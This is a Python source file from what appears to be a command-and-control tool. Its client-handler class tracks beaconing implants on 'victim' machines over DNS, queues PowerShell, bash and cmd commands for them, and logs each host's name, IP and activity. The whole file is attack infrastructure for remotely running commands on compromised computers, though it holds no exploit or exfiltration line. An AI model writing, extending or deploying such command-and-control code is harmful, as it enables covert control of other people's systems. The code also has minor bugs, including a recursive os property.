from socketserver import BaseRequestHandler
import backend.handlers as handlers
from datetime import datetime
from frontend.util.structs import CommandType, Command
from collections import deque
from typing import Union
import json


class ProvenanceClientHandler(BaseRequestHandler):

    _client_count = 0

    """ Builtin Functions"""
    def __init__(self, request, client_address, serverinfo, hostname=None, handler=None):
        # Superclass initialization
        self.request = request
        self.client_address = client_address
        self.server = serverinfo

        # Subclass Initialization
        self._hostname = hostname or f"Client_{self._client_count}"
        self._os = None
        self._queued_commands = deque()
        self._sent_commands = []
        self._command_count = 0
        self._last_active: Union[datetime, None] = None
        self._client_count += 1

        # The model that tracks each controlled machine
        # TODO: somehow dynamically assess the protocol (maybe set up multiple ports)
        self._protocol_handler = None
        if request:
            self._protocol_handler = handler or handlers.dns.DNSHandler(
                ip=client_address[0], socket=request[1]
            )

    def __repr__(self):
        return f"ProvenanceClient{{{self.server[1]}, {self._hostname}}}"

    def encode(self):
        return {
            "beacon": self.beacon_type,
            "hostname": self._hostname,
            "ip": self.get_ip,
            "active": self.get_last_active,
            "commands": [dict(c._asdict()) for c in self._queued_commands]
        }

    # Application-Based Methods

    def update_handler(self, request,  client_address):
        """
        Update this instance to use the new request and socket
        parameters. Originally :module: socketserver.UDPServer
        would create a new instance for each request, this
        method must be called or the request will be sent
        to the previous temporary port used by the beacon
        to call back
        :param request: the request received by the server
        :param client_address: tuple of (IP, port)
        :return: None
        """
        self.client_address = client_address
        self.request = request
        if not self._protocol_handler:
            self._protocol_handler = handlers.dns.DNSHandler(
                ip=client_address[0], socket=request[1]
            )

    def handle(self):
        """
        The method required by BaseRequestHandler that handles the
        incoming request. Will tell the underlying protocol
        handler (DNS, HTTP, ICMP, etc) to send the given command if there
        is one queued, else send NOP
        :return:  None
        """
        _, port = self.client_address
        self._last_active = datetime.now()
        if self._queued_commands:
            cmd_to_be_sent = self._queued_commands.popleft()
        else:
            cmd_to_be_sent = Command(CommandType.NOP, "NONE")
        self._protocol_handler.handle_request(self.request, port, cmd_to_be_sent)
        self._sent_commands.append((self._command_count, cmd_to_be_sent))

    def queue_command(self, ctype, cmd):
        """
        The server method used to interact with the underyling
        model representing the victim machine. Will queue a
        command to be sent next time the beacon calls back
        :param ctype: type of command :module: protocolhandler.Commands
        :param cmd: the command to be sent
        :return: None
        """
        convert = {"ps": CommandType.PS, "bash": CommandType.BASH, "cmd": CommandType.CMD}
        command_type = convert[ctype]
        self._queued_commands.append(Command(command_type, cmd, self._command_count))
        self._command_count += 1

    def remove_command(self, cmd_id):
        """
        The server method used to interact with the underyling
        model representing the victim machine. Will queue a
        command to be sent next time the beacon calls back
        :param cmd_id: the id of the command to be deleted
        :return: None
        """
        for cmd in self._queued_commands:
            if cmd.uid == cmd_id:
                self._queued_commands.remove(cmd)

    # Backend Methods for model querying

    @property
    def os(self):
        return self.os

    @property
    def queued_commands(self):
        return self._queued_commands

    @property
    def get_sent_commands(self):
        return self._sent_commands

    @property
    def get_last_active(self):
        # TODO: change to be datetime object not string
        # TODO: and convert encode
        if not self._last_active:
            return None
        else:
            delta = datetime.now() - self._last_active
            return delta.seconds//60

    @property
    def get_command_count(self):
        return self._command_count

    @property
    def get_hostname(self):
        return self._hostname

    @property
    def get_ip(self):
        if not self.client_address:
            return None
        return self.client_address[0]

    @property
    def beacon_type(self):
        return self._protocol_handler.__repr__()



